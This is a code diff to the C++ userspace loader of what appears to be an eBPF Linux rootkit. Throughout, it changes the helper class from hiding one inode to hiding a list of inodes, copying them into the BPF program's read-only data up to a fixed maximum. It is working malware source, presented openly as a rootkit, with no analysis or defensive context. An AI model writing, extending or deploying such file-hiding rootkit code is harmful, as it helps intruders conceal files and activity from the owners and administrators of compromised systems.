@@ -2,6 +2,7 @@
 #include "common.h"
 #include "rootkit.skel.h"
 
+#include <cstring>
 #include <iostream>
 #include <format>
 #include <optional>
@@ -11,12 +12,12 @@ extern "C" {
 #include <bpf/libbpf.h>
 }
 
-rootkit::RootkitBpfHelper::RootkitBpfHelper(const uint64_t inode_to_hide,
+rootkit::RootkitBpfHelper::RootkitBpfHelper(std::vector<uint64_t> inodes_to_hide,
     int (* rb_callback)(void *, void *, unsigned long)
 )
     :skel(nullptr),
     rb(nullptr),
-    inode_to_hide(inode_to_hide),
+    inodes_to_hide(std::move(inodes_to_hide)),
     error_msg("")
 {
     // Open the skeleton
@@ -27,8 +28,10 @@ rootkit::RootkitBpfHelper::RootkitBpfHelper(const uint64_t inode_to_hide,
         return;
     }
 
-    // Set volatile consts
-    skel->rodata->inode_to_hide = this->inode_to_hide;
+    if (!setup_volatile_consts()) {
+        clean();
+        return;
+    }
 
     // Load the program
     int err = rootkit_bpf__load(skel);
@@ -119,6 +122,25 @@ void rootkit::RootkitBpfHelper::setup_msg_ring_buffer(
         clean();
         return;
     }
+}
+
+bool rootkit::RootkitBpfHelper::setup_volatile_consts() {
+    if (this->inodes_to_hide.size() > INODES_TO_HIDE_LEN) {
+        error_msg = std::format(
+            "Maximum allowed inodes to hide is {}",
+            INODES_TO_HIDE_LEN);
+        return false;
+    }
+
+    // Copy inodes_to_hide from vector to the bpf skel memory
+    std::memcpy(skel->rodata->inodes_to_hide,
+                this->inodes_to_hide.data(),
+                this->inodes_to_hide.size() * sizeof(this->inodes_to_hide[0]));
+
+    // Set size of the inodes_to_hide in bpf skel
+    skel->rodata->inodes_to_hide_len = this->inodes_to_hide.size();
+
+    return true;
 }
 
 void rootkit::RootkitBpfHelper::setup_arr_links() {
